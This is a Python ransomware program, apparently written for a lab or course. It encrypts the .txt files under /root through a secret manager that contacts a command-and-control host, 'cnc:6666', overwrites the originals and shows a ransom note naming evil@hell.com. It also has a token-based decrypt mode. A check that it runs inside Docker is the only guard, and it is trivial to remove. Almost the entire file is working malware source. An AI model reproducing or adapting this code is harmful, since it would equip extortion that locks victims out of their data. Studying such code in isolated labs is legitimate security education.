import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        return list(Path("/root").glob(filter))

    def encrypt(self):
        # main function for encrypting (see PDF)
        # get all the txt files
        files = self.get_files("*.txt")
        # create a secret manager
        secret_manager = SecretManager(CNC_ADDRESS)
        # call the setup
        secret_manager.setup()
        # encrypt the files
        for file in files:
            with open(file, "rb") as f:
                data = f.read()
            encrypted_data = secret_manager.encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted_data)
        # print the message
        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        # try exept to catch the exception if the token is not valid
        try:
            # ask the user for the token
            token = input("Token: ")
            # call set_key
            secret_manager = SecretManager(CNC_ADDRESS)
            secret_manager.set_key(token)
            # call the xorfile function
            files = self.get_files("*.txt")
            for file in files:
                secret_manager.xorfile(file)
            #call the clean function
            secret_manager.clean()
            # print the message
            print("Your files have been decrypted")
            # leave the program
            sys.exit(0)
        except Exception as e:
            # print the error message
            print("Invalid token")
            # go back to the main function
            self.decrypt()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()